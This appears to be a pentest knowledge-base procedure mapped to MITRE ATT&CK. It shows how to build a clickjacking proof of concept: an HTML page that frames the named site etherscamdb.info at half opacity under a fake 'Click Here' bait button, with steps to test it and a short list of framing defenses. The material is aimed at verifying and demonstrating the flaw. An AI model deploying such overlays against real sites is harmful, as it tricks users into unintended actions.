---
tags:
  - poc
  - iframe
  - clickjacking
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:12.622Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
id: a00fe4b5-9b28-419e-8cc8-caeac3b305d0
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Clickjacking-POC

## Summary

This procedure creates a simple HTML proof-of-concept to demonstrate clickjacking by embedding a vulnerable site in an iframe, showing how attackers can overlay deceptive elements.

## Description

Clickjacking exploits occur when a site can be framed without restrictions, allowing attackers to create malicious pages that trick users into clicking hidden elements. For etherscamdb.info, lacking frame protections, a basic HTML file with an iframe suffices to prove the issue. This POC can be extended with CSS overlays for realistic attacks, leading to unintended user actions and trust damage.

## Requirements

1. Text editor to create HTML file
2. Web browser to test
3. Target URL that allows framing

## Defense

Defensive measures and detection strategies:

- Enforce CSP frame-ancestors to block external framing
- Use X-Frame-Options: DENY
- Detect iframe embeddings via client-side JavaScript checks

## Objectives

1. Verify the site can be embedded in an iframe
2. Demonstrate potential for UI manipulation
3. Provide visual evidence of the vulnerability

## Instructions

### Step 1: Create HTML File

**Context**: Build the basic POC structure with an iframe.

Open a text editor and create a file named clickjacking.html with the following content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking POC</title>
    <style>
        iframe { position: absolute; top: 0; left: 0; opacity: 0.5; }
        .bait { position: absolute; top: 100px; left: 100px; z-index: 1; }
    </style>
</head>
<body>
    <button class="bait">Click Here (Fake Button)</button>
    <iframe src="https://etherscamdb.info"></iframe>
</body>
</html>
```

### Step 2: Test in Browser

**Context**: Load the POC to confirm embedding and simulate overlay.

Save the file and open it in a web browser. Observe the target site loading in the iframe without errors.

> Expected output: etherscamdb.info displays inside the iframe, with the fake button overlay possible for tricking clicks.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[poc]]
- [[clickjacking]]
